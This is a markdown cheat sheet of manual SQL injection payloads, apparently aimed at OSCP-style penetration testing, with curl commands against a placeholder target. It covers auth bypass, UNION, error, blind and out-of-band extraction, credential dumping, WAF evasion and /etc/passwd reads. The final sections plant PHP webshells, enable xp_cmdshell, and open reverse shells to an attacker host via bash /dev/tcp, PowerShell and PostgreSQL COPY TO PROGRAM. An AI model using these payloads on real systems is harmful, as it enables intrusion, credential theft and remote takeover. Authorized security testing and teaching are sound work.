# SQL Injection 

> `<ATTACKER_IP>` = your machine, `<TARGET_IP>` = target. Manual payloads only, every payload commented with when/why to use it.

---

## Table of Contents

1. [Where to Test](#1-where-to-test)
2. [Detection Payloads](#2-detection-payloads)
3. [Auth Bypass Payloads](#3-auth-bypass-payloads)
4. [Determining Column Count — ORDER BY / UNION](#4-determining-column-count--order-by--union)
5. [UNION-Based Extraction](#5-union-based-extraction)
6. [Error-Based Extraction](#6-error-based-extraction)
7. [Boolean-Based Blind](#7-boolean-based-blind)
8. [Time-Based Blind](#8-time-based-blind)
9. [Out-of-Band (OOB)](#9-out-of-band-oob)
10. [Database-Specific Cheat Sheets](#10-database-specific-cheat-sheets)
    - 10.1 MySQL
    - 10.2 MSSQL
    - 10.3 PostgreSQL
    - 10.4 Oracle
    - 10.5 SQLite
11. [WAF / Filter Bypass Payloads](#11-waf--filter-bypass-payloads)
12. [Second-Order & Stored SQLi](#12-second-order--stored-sqli)
13. [File Read/Write via SQLi](#13-file-readwrite-via-sqli)
14. [RCE via SQLi → Shell](#14-rce-via-sqli--shell)
15. [Quick Reference Card](#15-quick-reference-card)

---

## 1. Where to Test

```
?id=          ?user=         ?search=        ?category=
?product=     ?page=          ?sort=          ?order=
?filter=      ?q=             ?name=          ?username=
Login forms (username/password fields)
Cookie values, Referer header, User-Agent header (header-based SQLi)
JSON API body fields
```

---

## 2. Detection Payloads

```sql
-- Single quote: breaks string context, causes SQL syntax error if vulnerable
'
-- Double quote: same idea, for double-quoted string contexts
"
-- Comment terminator: closes off the rest of the query
'--
'#
'/*
-- Always-true condition appended: confirms injection point in numeric/string context
' OR '1'='1
' OR 1=1--
" OR "1"="1
-- Math-based confirmation in numeric parameter (no quotes needed)
1 AND 1=1
1 AND 1=2
-- if response differs between these two -> confirmed numeric SQLi
```

```bash
# curl test against a GET parameter
curl "http://<TARGET_IP>/item.php?id=1'"
curl "http://<TARGET_IP>/item.php?id=1 AND 1=1"
curl "http://<TARGET_IP>/item.php?id=1 AND 1=2"
# compare response length/content between the two
```

---

## 3. Auth Bypass Payloads

```sql
-- Classic comment-based bypass: comments out the password check entirely
admin'--
admin'#
admin'/*
-- Always-true OR injected into the password field
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 'x'='x
-- Closing and re-opening the query structure manually
admin' OR '1'='1'--
admin'-- -
-- UNION-based login bypass (when app does: SELECT * FROM users WHERE user=$u AND pass=$p)
' UNION SELECT 1,'admin','anything'--
-- Login bypass for NUMERIC-style queries (no quotes in original query)
1 OR 1=1
-- Bypass when input is concatenated into both fields
' OR '1'='1' OR '1'='1
```

```bash
# Send via curl to a login form
curl -X POST http://<TARGET_IP>/login.php \
  -d "username=admin'--&password=anything"

curl -X POST http://<TARGET_IP>/login.php \
  -d "username=admin&password=' OR '1'='1"
```

---

## 4. Determining Column Count — ORDER BY / UNION

```sql
-- ORDER BY method: increase the number until you get an error (column doesn't exist)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--      -- error here = query has 3 columns

-- UNION method: same idea, using NULL placeholders, error-free version errors out when count is wrong
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    -- works = 3 columns confirmed
```

```bash
for i in 1 2 3 4 5 6; do
  echo "Testing $i columns:"
  curl -s "http://<TARGET_IP>/item.php?id=1' ORDER BY $i--+-" | grep -i "error"
done
```

---

## 5. UNION-Based Extraction

```sql
-- Once column count is known (e.g. 3), find which columns are REFLECTED in the page output
' UNION SELECT 1,2,3--
-- whichever number appears on the page (e.g. "2") is your usable output column

-- Pull current DB user, DB name, version into a reflected column
' UNION SELECT 1,@@version,3--                          -- MySQL
' UNION SELECT 1,version(),3--                          -- MySQL/Postgres
' UNION SELECT 1,user(),3--                              -- MySQL current user
' UNION SELECT 1,current_user(),3--                      -- Postgres current user
' UNION SELECT 1,db_name(),3--                            -- MSSQL current DB

-- List all database names
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--

-- List all tables in current database
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- List all columns of a specific table (e.g. "users")
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Dump actual credentials once you know table/column names
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
-- 0x3a is hex for ":" -- used as a separator so output is readable as user:pass pairs
```

```bash
curl -s "http://<TARGET_IP>/item.php?id=-1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--+-"
```

---

## 6. Error-Based Extraction

```sql
-- MySQL: forces DB version/data into a visible error message via XPATH function abuse
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--

-- MySQL alternative: double query-based error forcing (duplicate entry error leaks data)
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL: forces conversion error, leaking data into the error text
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL: forces a cast error revealing the queried value
' AND CAST((SELECT version()) AS int)--
```

```bash
curl -s "http://<TARGET_IP>/item.php?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))--+-"
# look at the error message returned in the response -- the DB version
# string will appear embedded inside the MySQL error text itself
```

---

## 7. Boolean-Based Blind

```sql
-- No visible output/errors -- page just behaves differently (true vs false) e.g. content present/absent
' AND 1=1--      -- page loads normally (TRUE)
' AND 1=2--      -- page behaves differently / empty (FALSE)

-- Confirm DB version character by character using SUBSTRING
' AND SUBSTRING((SELECT version()),1,1)='5'--
' AND SUBSTRING((SELECT version()),1,1)='8'--

-- Confirm table existence
' AND (SELECT COUNT(*) FROM users)>0--

-- Extract data char by char (MySQL example -- repeat per character position)
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='b'--
-- iterate a-z, 0-9 per position until TRUE response found, then move to position 2
```

```bash
# Automating one character position manually with a loop
for c in {a..z} {0..9}; do
  resp=$(curl -s "http://<TARGET_IP>/item.php?id=1' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='$c'--+-")
  if echo "$resp" | grep -q "Welcome"; then
    echo "First char: $c"
    break
  fi
done
```

---

## 8. Time-Based Blind

```sql
-- Use when there's NO visible difference at all (same page regardless of true/false) -- rely on response delay
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

```bash
# baseline
time curl -s "http://<TARGET_IP>/item.php?id=1" -o /dev/null
# injected
time curl -s "http://<TARGET_IP>/item.php?id=1' AND IF(1=1,SLEEP(5),0)--+-" -o /dev/null
# ~5 sec slower = confirmed blind SQLi
```

---

## 9. Out-of-Band (OOB)

```sql
-- Use when there's no output, no error, AND no measurable timing difference (fully async backend)
-- MSSQL -- forces an outbound DNS lookup to a domain you control/monitor
'; exec master..xp_dirtree '//<ATTACKER_IP>/share'--

-- MySQL -- forces outbound DNS via LOAD_FILE on a UNC-style path (Windows-hosted MySQL only)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.<ATTACKER_IP>\\share'))--

-- Oracle -- forces outbound HTTP/DNS request via UTL_HTTP or UTL_INADDR
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.<ATTACKER_IP>')--
```

```bash
# Listener on attacker side to catch the callback
sudo tcpdump -i tun0 port 53 -n
# or
nc -lvnp 80
```

---

## 10. Database-Specific Cheat Sheets

### 10.1 MySQL

```sql
SELECT @@version                                   -- version
SELECT user()                                       -- current DB user
SELECT database()                                    -- current DB name
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata     -- list DBs
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()  -- list tables
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'     -- list columns
SELECT load_file('/etc/passwd')                      -- read file (needs FILE priv)
SELECT 'shell_code' INTO OUTFILE '/var/www/html/shell.php'   -- write file (needs FILE priv + writable dir)
```

### 10.2 MSSQL

```sql
SELECT @@version                                     -- version
SELECT SYSTEM_USER                                    -- current user
SELECT DB_NAME()                                       -- current DB
SELECT name FROM master..sysdatabases                  -- list DBs
SELECT table_name FROM information_schema.tables       -- list tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'  -- list columns
EXEC xp_cmdshell 'whoami'                               -- OS command exec (needs sysadmin + xp_cmdshell enabled)
EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;  -- enable xp_cmdshell if disabled
```

### 10.3 PostgreSQL

```sql
SELECT version()                                       -- version
SELECT current_user                                      -- current user
SELECT current_database()                                 -- current DB
SELECT datname FROM pg_database                            -- list DBs
SELECT table_name FROM information_schema.tables WHERE table_schema='public'   -- list tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'    -- list columns
COPY (SELECT '') TO PROGRAM 'id'                            -- OS command exec (superuser only, PG 9.3+)
CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;  -- exec + read output
```

### 10.4 Oracle

```sql
SELECT banner FROM v$version                            -- version
SELECT user FROM dual                                      -- current user
SELECT global_name FROM global_name                         -- current DB
SELECT owner FROM all_tables                                 -- list schema owners
SELECT table_name FROM all_tables WHERE owner='SCOTT'         -- list tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'  -- list columns
```

### 10.5 SQLite

```sql
SELECT sqlite_version()                                  -- version
SELECT name FROM sqlite_master WHERE type='table'           -- list tables
SELECT sql FROM sqlite_master WHERE name='users'              -- show table schema/columns
```

---

## 11. WAF / Filter Bypass Payloads

```sql
-- Space stripped: use comments instead of spaces
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/1,2,3--

-- Keyword "UNION" or "SELECT" blocked: case variation (some filters case-sensitive)
' UnIoN SeLeCt 1,2,3--

-- Double-keyword bypass (filter strips first instance, leaves the rest intact)
' UNIONUNION SELECT SELECT 1,2,3--

-- Comments mid-keyword to break signature matching
' UNI/**/ON SEL/**/ECT 1,2,3--

-- Encoded payload (URL encoding)
%27%20OR%201%3D1--%20-

-- Hex-encoded string literals instead of quoted strings (avoids quote-stripping filters)
' UNION SELECT 1,0x61646d696e,3--      -- 0x61646d696e = hex for "admin"

-- Using CHAR()/CHR() to build strings without quotes at all
' UNION SELECT 1,CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110)),3--   -- builds "admin"

-- Alternative comment styles per DB if -- gets filtered
#                  -- MySQL alternative line comment
;%00                -- null byte truncation trick (older/legacy parsers)
```

---

## 12. Second-Order & Stored SQLi

```sql
-- Payload stored in one field, triggers when READ/displayed elsewhere later
-- e.g. register with this as your "username", injection fires when an admin
-- panel later runs a query that includes your stored username unsanitized
admin'-- 
robert'); DROP TABLE students;--          -- classic "Bobby Tables" pattern

-- Profile/display name field that gets used in a backend report-generation query
' UNION SELECT username,password FROM users WHERE ''='
```

```bash
# Register/update a profile field with the payload, THEN visit whatever
# admin page/report/export feature later reads that field back out
curl -X POST http://<TARGET_IP>/register.php -d "username=admin'--&email=test@test.com&password=test123"
# Now visit/trigger the admin panel that lists usernames -- injection fires there
```

---

## 13. File Read/Write via SQLi

```sql
-- MySQL file read (needs FILE privilege + secure_file_priv not restrictive)
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('C:\\Windows\\System32\\drivers\\etc\\hosts'),3--

-- MySQL file write -- drop a webshell directly via INTO OUTFILE
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL file read via OPENROWSET (needs sysadmin)
'; SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents--

-- PostgreSQL file read (needs superuser)
' UNION SELECT 1,(SELECT string_agg(line,E'\n') FROM (SELECT pg_read_file('/etc/passwd') AS line) sub),3--
```

```bash
# trigger the dropped webshell
curl "http://<TARGET_IP>/shell.php?cmd=id"
```

---

## 14. RCE via SQLi → Shell

```sql
-- MySQL path: write webshell via INTO OUTFILE, then hit it directly
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/s.php'--
```
```bash
curl "http://<TARGET_IP>/s.php?c=id"
curl "http://<TARGET_IP>/s.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<LPORT>+0>%261'"
```

```sql
-- MSSQL path: enable and use xp_cmdshell directly
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client=New-Object Net.Sockets.TCPClient(\"<ATTACKER_IP>\",<LPORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$r=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($r,0,$r.Length);$stream.Flush()};$client.Close()"'--
```
```bash
nc -lvnp <LPORT>
```

```sql
-- PostgreSQL path: COPY ... FROM PROGRAM directly executes OS commands
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1"'--
```

---

## 15. Quick Reference Card

```
====================================================================
 SQL INJECTION — PAYLOAD QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = target
====================================================================

[DETECTION]
  '          1 AND 1=1   vs   1 AND 1=2

[AUTH BYPASS]
  admin'--
  ' OR '1'='1
  ' OR 1=1#

[COLUMN COUNT]
  ' ORDER BY 1--   ' ORDER BY 2--  ... until error
  ' UNION SELECT NULL,NULL,NULL--

[UNION EXTRACTION]
  ' UNION SELECT 1,@@version,3--
  ' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--
  ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--

[ERROR-BASED]
  ' AND extractvalue(1,concat(0x7e,(SELECT version())))--          [MySQL]
  ' AND 1=CONVERT(int,(SELECT @@version))--                         [MSSQL]

[BOOLEAN BLIND]
  ' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--

[TIME BLIND]
  ' AND IF(1=1,SLEEP(5),0)--                                        [MySQL]
  '; IF (1=1) WAITFOR DELAY '0:0:5'--                                [MSSQL]

[OOB]
  '; exec master..xp_dirtree '//<ATTACKER_IP>/share'--                [MSSQL]

[WAF BYPASS]
  '/**/OR/**/1=1--
  ' UnIoN SeLeCt 1,2,3--
  ' UNION SELECT 1,0x61646d696e,3--

[FILE READ/WRITE]
  ' UNION SELECT 1,load_file('/etc/passwd'),3--
  ' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/s.php'--

[RCE -> SHELL]
  MySQL:  drop webshell via OUTFILE -> curl shell.php?c=...
  MSSQL:  enable + EXEC xp_cmdshell '...'
  Postgres: COPY (SELECT '') TO PROGRAM 'bash -c "..."'

[REVERSE SHELL ONE-LINER once cmd exec confirmed]
  bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'
====================================================================
```

---

*Authorized pentesting / OSCP lab use only.*
